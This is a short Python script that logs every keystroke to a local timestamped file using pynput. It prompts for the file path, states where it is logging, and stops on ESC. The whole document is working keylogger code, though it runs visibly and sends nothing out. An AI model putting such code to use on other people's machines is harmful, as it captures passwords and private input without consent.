from pynput import keyboard
import logging, os
from datetime import datetime

# Get file path
path = input("Log file path (Enter for desktop): ").strip() or os.path.join(os.path.expanduser("~"), "Desktop", "keylog.txt")
path = path.strip('"\'')

# Setup logging
os.makedirs(os.path.dirname(path) or '.', exist_ok=True)
logging.basicConfig(filename=path, level=logging.DEBUG, format='%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

# Key mappings
special = {keyboard.Key.space: 'SPACE', keyboard.Key.enter: 'ENTER', keyboard.Key.tab: 'TAB',
           keyboard.Key.backspace: 'BACKSPACE', keyboard.Key.shift: 'SHIFT', keyboard.Key.ctrl: 'CTRL',
           keyboard.Key.alt: 'ALT', keyboard.Key.esc: 'ESC', keyboard.Key.delete: 'DELETE',
           keyboard.Key.up: 'UP', keyboard.Key.down: 'DOWN', keyboard.Key.left: 'LEFT',
           keyboard.Key.right: 'RIGHT', keyboard.Key.caps_lock: 'CAPS', keyboard.Key.cmd: 'WIN'}

def on_press(key):
    try:
        logging.info(f'Key: {key.char if hasattr(key, "char") and key.char else special.get(key, str(key))}')
    except: pass

def on_release(key):
    if key == keyboard.Key.esc:
        logging.info('Stopped')
        return False

print(f"\nLogging to: {path}\nPress ESC to stop")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
print(f"\nLogs saved to: {path}")
